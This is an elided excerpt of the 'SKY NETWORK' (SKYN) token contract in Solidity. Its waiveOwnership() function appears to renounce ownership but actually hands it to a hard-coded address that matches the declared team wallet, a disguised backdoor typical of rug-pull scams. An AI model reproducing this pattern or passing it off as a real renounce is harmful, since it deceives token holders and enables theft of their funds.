...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4048db3BaF04A07Aaf5d36Ea882505Cf97f6e462);
    }
...
contract SKYNETWORK is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SKY NETWORK";
    string private _symbol = "SKYN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xcE4b62803873819307e904FC8816B8A25BC860d4);
    address payable public teamWalletAddress = payable(0x4048db3BaF04A07Aaf5d36Ea882505Cf97f6e462);
